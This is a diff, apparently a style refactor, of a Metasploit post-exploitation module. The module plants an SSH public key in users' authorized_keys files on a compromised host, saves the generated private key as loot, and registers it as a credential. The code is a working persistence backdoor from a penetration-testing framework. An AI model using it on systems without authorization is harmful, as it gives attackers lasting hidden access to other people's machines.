@@ -47,26 +47,26 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if session.type == "meterpreter"
+    if session.type == 'meterpreter'
       sep = session.fs.file.separator
     else
       # Guess, but it's probably right
-      sep = "/"
+      sep = '/'
     end
     print_status('Checking SSH Permissions')
     sshd_config = read_file(datastore['SSHD_CONFIG'])
-    /^PubkeyAuthentication[\s]+(?<pub_key>yes|no)/ =~ sshd_config
+    /^PubkeyAuthentication\s+(?<pub_key>yes|no)/ =~ sshd_config
     if pub_key && pub_key == 'no'
       print_error('Pubkey Authentication disabled')
     elsif pub_key
       vprint_good("Pubkey set to #{pub_key}")
     end
-    /^AuthorizedKeysFile[\s]+(?<auth_key_file>[\w%\/\.]+)/ =~ sshd_config
+    %r{^AuthorizedKeysFile\s+(?<auth_key_file>[\w%/.]+)} =~ sshd_config
     if auth_key_file
       auth_key_file = auth_key_file.gsub('%h', '')
       auth_key_file = auth_key_file.gsub('%%', '%')
       if auth_key_file.start_with? '/'
-        auth_key_file = auth_key_file[1..-1]
+        auth_key_file = auth_key_file[1..]
       end
     else
       auth_key_file = '.ssh/authorized_keys'
@@ -109,7 +109,7 @@ class MetasploitModule < Msf::Post
     if datastore['PUBKEY'].nil?
       key = SSHKey.generate
       our_pub_key = key.ssh_public_key
-      loot_path = store_loot("id_rsa", "text/plain", session, key.private_key, "ssh_id_rsa", "OpenSSH Private Key File")
+      loot_path = store_loot('id_rsa', 'text/plain', session, key.private_key, 'ssh_id_rsa', 'OpenSSH Private Key File')
       print_good("Storing new private key as #{loot_path}")
     else
       our_pub_key = ::File.read(datastore['PUBKEY'])
@@ -119,23 +119,23 @@ class MetasploitModule < Msf::Post
       authorized_keys = "#{path}/#{auth_key_file}"
       print_status("Adding key to #{authorized_keys}")
       append_file(authorized_keys, "\n#{our_pub_key}")
-      print_good("Key Added")
-      if datastore['PUBKEY'].nil?
-        path_array = path.split(sep)
-        path_array.pop
-        user = path_array.pop
-        credential_data = {
-          origin_type: :session,
-          session_id: session_db_id,
-          post_reference_name: refname,
-          private_type: :ssh_key,
-          private_data: key.private_key.to_s,
-          username: user,
-          workspace_id: myworkspace_id
-        }
+      print_good('Key Added')
+      next unless datastore['PUBKEY'].nil?
 
-        create_credential(credential_data)
-      end
+      path_array = path.split(sep)
+      path_array.pop
+      user = path_array.pop
+      credential_data = {
+        origin_type: :session,
+        session_id: session_db_id,
+        post_reference_name: refname,
+        private_type: :ssh_key,
+        private_data: key.private_key.to_s,
+        username: user,
+        workspace_id: myworkspace_id
+      }
+
+      create_credential(credential_data)
     end
   end
 end
